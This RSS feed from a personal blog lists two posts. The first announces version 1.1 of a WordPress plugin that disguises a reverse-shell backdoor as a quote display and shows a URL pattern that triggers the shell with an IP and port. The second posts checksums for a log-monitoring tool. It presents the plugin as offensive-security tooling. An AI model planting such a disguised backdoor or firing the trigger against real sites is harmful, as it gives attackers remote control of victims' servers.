<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Open Source on Hi, I&#39;m Kyle</title>
    <link>https://jovial-yonath-8d9e17.netlify.app/categories/open-source/</link>
    <description>Recent content in Open Source on Hi, I&#39;m Kyle</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 07 May 2019 01:33:19 +0000</lastBuildDate>
    
	<atom:link href="https://jovial-yonath-8d9e17.netlify.app/categories/open-source/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Conwell Quotes v1.1</title>
      <link>https://jovial-yonath-8d9e17.netlify.app/2019/05/07/conwell-quotes-v1-1/</link>
      <pubDate>Tue, 07 May 2019 01:33:19 +0000</pubDate>
      
      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/05/07/conwell-quotes-v1-1/</guid>
      <description>Conwell Quotes is a malicious WordPress plugin that hides a reverse shell in a backdoor behind legitimate plugin functionality. This is used for offensive security purposes.
This is an update to version 1.1. This update now allows you to pass your ip and port as URL parameters rather than updating the error.php file prior to upload.
http://example.com/wp-content/plugins/conwell/error.php?ip=XX.XXX.XXX.X&amp;amp;port=XXXX
You can find the open source code on GitHub.
Modeled after the Hello Dolly plugin which comes packaged on all new WordPress installations, Conwell Quotes displays a random quote on each page of the WordPress admin portal based on Conwell&amp;rsquo;s Acres of Diamonds (which is one of my favorite books).</description>
    </item>
    
    <item>
      <title>SHA-256 checksums for LogWatcher</title>
      <link>https://jovial-yonath-8d9e17.netlify.app/2018/12/07/sha-256-checksums-for-logwatcher/</link>
      <pubDate>Fri, 07 Dec 2018 20:14:48 +0000</pubDate>
      
      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/12/07/sha-256-checksums-for-logwatcher/</guid>
      <description>The more I was thinking about it, since LogWatcher is a server utility and may occasionally be run with escalated privileges, I thought it would be wise to publish checksums for integrity.
LogWatcher is a utility to perform very simple automated system monitoring and alerting. It is an ideal solution to use in conjunction with a web app that has a sound event logging architecture implemented. LogWatcher simply watches an error log file for any anomalous behavior.</description>
    </item>
    
  </channel>
</rss>